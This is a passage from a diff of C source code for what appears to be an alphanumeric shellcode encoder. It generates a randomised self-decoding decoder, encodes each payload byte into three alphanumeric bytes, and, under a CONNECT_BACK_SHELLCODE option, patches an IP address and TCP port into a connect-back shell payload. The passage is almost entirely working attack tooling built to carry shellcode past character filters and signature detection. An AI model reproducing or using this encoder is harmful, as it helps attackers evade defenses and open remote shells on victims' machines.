@@ -1,0 +1,155 @@
+///                          |   |
+        is_alnum((UCHAR)size_decoder+(decoder_version_1?0:2))?"valid":"invalid - not alphanumeric!!!");//                          |   |
+    *(decoder+offset_imul_instruction3)                 = size_decoder+(decoder_version_1?0:2);    //////                          |   |
+                                                                                                   //                              |   |
+    printf("half_size_decoder=0x%2X - %s\n",                                                       //                              |   |
+        (UCHAR)half_size_decoder,                                                                  //                              |   |
+        is_alnum((UCHAR)half_size_decoder)?"valid":"invalid - not alphanumeric!!!");               //                              |   |
+    *(decoder+offset_half_size_decoder)                   = half_size_decoder;                     //                              |   |
+                                                                                                   //                              |   |
+    printf("offset_imul_key=0x%2X - %s\n",                                                         //                              |   |
+        (UCHAR)offset_imul_key,                                                                    //                              |   |
+        is_alnum((UCHAR)offset_imul_key)?"valid":"invalid - not alphanumeric!!!");                 //                              |   |
+    *(decoder+offset_imul_key_offset1)                    = offset_imul_key;                       //                              |   |
+    *(decoder+offset_imul_key_offset2)                    = offset_imul_key;                       //                              |   |
+    *(decoder+offset_imul_key_offset3)                    = offset_imul_key;                       //                              |   |
+    //                                                                                             //                              |   |
+    printf("size_decoder-1=0x%2X - %s\n",                                                          //                              |   |
+        (UCHAR)size_decoder-1,                                                                     //                              |   |
+        is_alnum((UCHAR)(size_decoder-1))?"valid":"invalid - not alphanumeric!!!");                //                              |   |
+    *(decoder+offset_size_decoder_min_1)                  = size_decoder-1;                        //                              |   |
+                                                                                                   //                              |   |
+    printf("size_decoder+2=0x%2X - %s\n",                                                          //                              |   |
+        (UCHAR)size_decoder+2,                                                                     ////////                        |   |
+        is_alnum((UCHAR)(size_decoder+(decoder_version_1?2:0)))?"valid":"invalid - not alphanumeric!!!");//                        |   |
+    *(decoder+offset_size_decoder_pls_2)                = size_decoder+(decoder_version_1?2:0);    ////////                        |   |
+                                                                                                   //                              |   |
+    *(decoder+size_decoder-negative_offset_size_decoder1) = size_decoder;                          //                              |   |
+    *(decoder+size_decoder-negative_offset_size_decoder2) = size_decoder;                          //                              |   |
+    *(decoder+size_decoder-negative_offset_size_decoder3) = size_decoder;                          //////////////////////////////  |   |
+                                                                                                                               //  |   |
+    *(decoder+offset_jne_xor1)                     = get_two_xor_complemets_for_byte_and_xor((UCHAR)(-jne_xor_negative_offset),//  |   |
+                                                                                             '\xFF',                           //  |   |
+                                                                                             0);                               //  |   |
+    *(decoder+offset_jne_xor2)                     = get_two_xor_complemets_for_byte_and_xor((UCHAR)(-jne_xor_negative_offset),//  |   |
+                                                                                             '\xFF',                           //  |   |
+                                                                                             1);                               //  |   |
+#ifdef CONNECT_BACK_SHELLCODE                                                                                                  //  |   |
+    ip_address                                     = ip_str_to_dw(IP_ADDRESS);///////////////////////////////////////////////////  |   |
+    if (ip_address == -1)    ///////////////////////////////////////////////////                                                   |   |
+        exit(-1);            //                                                                                                    |   |
+                             ///////////////////////////////////                                                                   |   |
+    //set shellcode with ip address and port for connect-back //                                                                   |   |
+    ///*                                                      //////////                                                           |   |
+    *((DWORD *)(p_shellcode+OFFSET_IP_ADDRESS))           = ip_address;/////////////////                                           |   |
+    *((DWORD *)(p_shellcode+OFFSET_TCP_PORT_NUMBER))      = my_htonl(TCP_PORT_NUMBER);//                                           |   |
+    *(p_shellcode+OFFSET_TCP_PORT_NUMBER)                 = (UCHAR)2;                 //                                           |   |
+#endif                                        //////////////////////////////////////////                                           |   |
+    //*/                                      //                                                                                   |   |
+    //set decoder with 'random' nop slides    //                                                                                   |   |
+    strncpy(decoder+offset_nop_slide1,        ////////////////////////////                                                         |   |
+            shuffle(get_nop_slide(size_nop_slide1, 1), size_nop_slide1),//                                                         |   |
+            size_nop_slide1);                                           //                                                         |   |
+    strncpy(decoder+offset_nop_slide2,                                  //                                                         |   |
+            shuffle(get_nop_slide(size_nop_slide2, 2), size_nop_slide2),//                                                         |   |
+            size_nop_slide2);              ///////////////////////////////                                                         |   |
+                                           //                                                                                      |   |
+    //set decoder with random initial key  ////////////////////////////////////////////                                            |   |
+    *(decoder+offset_imul_key)                            = get_random_alnum_value();//                                            |   |
+    printf("initial key=0x%2X - %s\n",                                               //////////////                                |   |
+           (UCHAR)*(decoder+offset_imul_key),                                                    //                                |   |
+           is_alnum((UCHAR)*(decoder+offset_imul_key))?"valid":"invalid - not alphanumeric!!!"); //                                |   |
+                                                                                                 //                                |   |
+                                                                                     //////////////                                |   |
+                                                                                     //                                            |   |
+    //set decoder with 'random' dword pushes for registers we won't use              ////////////////                              |   |
+    *(decoder+OFFSET_PUSH_DWORD1)                         = get_random_alnum_push_dword_opcode();  //                              |   |
+    printf("push dword1=0x%2X - %s\n",                                                             //                              |   |
+           (UCHAR)*(decoder+OFFSET_PUSH_DWORD1),                                                   //                              |   |
+           is_alnum((UCHAR)*(decoder+OFFSET_PUSH_DWORD1))?"valid":"invalid - not alphanumeric!!!");//                              |   |
+    *(decoder+OFFSET_PUSH_DWORD2)                         = get_random_alnum_push_dword_opcode();  //                              |   |
+    printf("push dword2=0x%2X - %s\n",                                                             //                              |   |
+           (UCHAR)*(decoder+OFFSET_PUSH_DWORD2),                                                   //                              |   |
+           is_alnum((UCHAR)*(decoder+OFFSET_PUSH_DWORD2))?"valid":"invalid - not alphanumeric!!!");//                              |   |
+    *(decoder+OFFSET_PUSH_DWORD3)                         = get_random_alnum_push_dword_opcode();  //                              |   |
+    printf("push dword3=0x%2X - %s\n",                                                             //                              |   |
+           (UCHAR)*(decoder+OFFSET_PUSH_DWORD3),                                                   //                              |   |
+           is_alnum((UCHAR)*(decoder+OFFSET_PUSH_DWORD3))?"valid":"invalid - not alphanumeric!!!");//                              |   |
+    *(decoder+OFFSET_PUSH_DWORD4)                         = get_random_alnum_push_dword_opcode();  //                              |   |
+    printf("push dword4=0x%2X - %s\n",                                                             //                              |   |
+           (UCHAR)*(decoder+OFFSET_PUSH_DWORD4),                                                   //                              |   |
+           is_alnum((UCHAR)*(decoder+OFFSET_PUSH_DWORD4))?"valid":"invalid - not alphanumeric!!!");//                              |   |
+                                                                                                   //                              |   |
+    //bugfix: this time after srand() :)                                                           //                              |   |
+    xor_al1=get_random_alnum_value();                                                              //                              |   |
+    xor_al2=get_random_alnum_value();                                                              //                              |   |
+    *(decoder+OFFSET_XOR_AL1_A) = xor_al1;                                                         //                              |   |
+    *(decoder+OFFSET_XOR_AL1_B) = xor_al1;                                                         //                              |   |
+    *(decoder+OFFSET_XOR_AL2_A) = xor_al2;                                                         //                              |   |
+    *(decoder+OFFSET_XOR_AL2_B) = xor_al2;                                                         //                              |   |
+                                                                                                   //                              |   |
+    memcpy(decoder+OFFSET_RANDOMIZED_DECODER_HEAD,                                             //////                              |   |
+           randomize_decoder_head(decoder, size_decoder, xor_al1, *(decoder+offset_jne_xor1)), // <---here-------------------------|---'
+           SIZE_RANDOMIZED_DECODER_HEAD);                                                      //////                              |
+    //set first xor1 to random alnum value (this is the first byte of the encoded data)            //                              |
+    xor1                                                  = get_random_alnum_value();              //                              |
+    printf("xor1=0x%2X - %s\n",                                                                    //                              |
+           (UCHAR)xor1,                                                                            //                              |
+           is_alnum((UCHAR)xor1)?"valid":"invalid - not alphanumeric!!!");                         //                              |
+                                            /////////////////////////////////////////////////////////                              |
+RE_RUN:                                     //                                                                                     |
+    sprintf(alnum_shellcode, "%s",decoder); //                                                                                     |
+    memset(temp_buf, 0, 3);///////////////////                                                                                     |
+    for(i=0; i<size; i++)  //                                                                                                      |
+    {   /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////      |
+        // each original byte is encoded into 3 alphanumeric bytes where first_byte*third_byte^second_byte==original_byte  //      |
+        // third_byte is the next encoded original byte's first_byte                                                       //      |
+        // the first byte of the terminating key is the last byte's third_byte                                             /////// |
+        p_xor2_key=get_xor2_and_key_for_xor1_and_c(xor1, shellcode[i]);//get a list of second_byte and third_byte for first_byte// |
+        if(!p_xor2_key)                                                                                                    /////// |
+            goto RE_RUN;                                                                                                   //      |
+        p_xor2_key = choose_random_node(p_xor2_key);//choose a random combination////////////////////////////////////////////      |
+        key=p_xor2_key->key;                                           //                                                          |
+        xor2=p_xor2_key->xor2;                                         //                                                          |
+        temp_buf[0] = xor1;                                            //                                                          |
+        temp_buf[1] = xor2;                                            //                                                          |
+        strcat(alnum_shellcode, temp_buf); // append it to our decoder //                                                          |
+        xor1=key;                                                      //                                                          |
+        free_p_xor2_key(p_xor2_key); // free the list                  //                                                          |
+    } //get next original_byte                                         //                                                          |
+                                                                       ////////////////////////                                    |
+    if (terminating_key_exist(alnum_shellcode+sizeof(decoder), str_end_of_encoded_shellcode))//                                    |
+    {                                                                                        //                                    |
+        printf("error - terminating key found in encoded shellcode. running again to fix\n");//                                    |
+        goto RE_RUN;                                                                         //                                    |
+    }                                     /////////////////////////////////////////////////////                                    |
+    *(UCHAR*)(alnum_shellcode+8)  = key; // set the last key of the encoded data to be the first byte of the terminating string    |
+    *(UCHAR*)(alnum_shellcode+9)  = get_random_alnum_value(); // choose 3 random alnum bytes for the rest of the terminating string|
+    *(UCHAR*)(alnum_shellcode+10) = get_random_alnum_value(); // choose 3 random alnum bytes for the rest of the terminating string|
+    *(UCHAR*)(alnum_shellcode+11) = get_random_alnum_value(); // choose 3 random alnum bytes for the rest of the terminating string|
+    strncat(alnum_shellcode,                                  // append the terminating string to the decoder+encoded shellcode    |
+            (UCHAR*)(alnum_shellcode+offset_terminating_key), //////////////////////////////                                       |
+            4);                                                                           //                                       |
+                                                                                          //                                       |
+    //bugfix: handle case of esp pointing to shellcode                                    //                                       |
+    if (!strcmp(Q(REGISTER_WITH_ADDRESS_OF_SHELLCODE), "esp"))                            //                                       |
+    {                                                                                     //                                       |
+        //    _asm{                                                                       //                                       |
+        //        push esp;                                                               //                                       |
+        //        pop eax;                                                                //                                       |
+        //        xor al, 0x36;                                                           //                                       |
+        //        xor al, 0x30;                                                           //                                       |
+        //    }                                                                           //                                       |
+        p_alnum_shellcode = malloc(strlen(alnum_shellcode)+1+6);                          //                                       |
+        memset(p_alnum_shellcode, 0, strlen(alnum_shellcode)+1+6);                        //                                       |
+        memcpy(p_alnum_shellcode+6, alnum_shellcode, strlen(alnum_shellcode)+1);          //                                       |
+        p_alnum_shellcode[0] = 'T';                                                       //                                       |
+        p_alnum_shellcode[1] = 'X'; // todo: randomize by using other registers than eax  //                                       |
+        p_alnum_shellcode[2] = '4'; //       and using other xor values                   //                                       |
+        p_alnum_shellcode[3] = '6'; // <-- (x+6)                                          //                                       |
+        p_alnum_shellcode[4] = '4'; //                                                    //                                       |
+        p_alnum_shellcode[5] = '0'; // <-- x                                              //                                       |
+        p_alnum_shellcode[8] = get_push_register_instruction("eax");                      //                                       |
+        p_alnum_shellcode[9] = get_push_register_instruction("eax");                      //                                       |
+        size_decoder += 6;                                                                //                                       |
+    }                       
